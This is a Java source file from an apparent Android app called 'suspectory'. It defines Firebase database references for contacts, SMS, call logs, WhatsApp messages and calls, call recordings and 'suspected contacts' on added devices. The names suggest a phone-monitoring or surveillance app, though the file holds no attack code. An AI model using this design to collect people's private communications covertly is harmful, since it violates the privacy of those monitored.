package com.aftab.suspectory.Utills;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;

public class FireRef {

    public static final DatabaseReference dataRef = FirebaseDatabase.getInstance().getReference();
    public static final FirebaseFirestore fireStore = FirebaseFirestore.getInstance();

    public static final FirebaseFirestore USERS_REF = fireStore;
    public static final DatabaseReference CONTACTS = dataRef.child(Constants.CONTACTS);
    public static final DatabaseReference DEVICES = dataRef.child(Constants.DEVICES);
    public static final DatabaseReference CALL_LOGS = dataRef.child(Constants.CALL_LOGS);
    public static final DatabaseReference SIM_SMS = dataRef.child(Constants.SIM_SMS);
    public static final DatabaseReference SUSPECTED_CONTACTS = dataRef.child(Constants.SUSPECTED_CONTACTS);
    public static final DatabaseReference WhATSAPP_MESSAGE = dataRef.child(Constants.WhATSAPP_MESSAGE);
    public static final DatabaseReference WhATSAPP_A_CALL_LOG = dataRef.child(Constants.WHATSAPP_A_CALL_LOG);
    public static final DatabaseReference WhATSAPP_V_CALL_LOG = dataRef.child(Constants.WHATSAPP_V_CALL_LOG);
    public static final DatabaseReference PRE_REC = dataRef.child(Constants.PRE_CALL_RECORDINGS);
    public static final DatabaseReference ADDED_DEVICES = dataRef.child(Constants.ADDED_DEVICES);

}
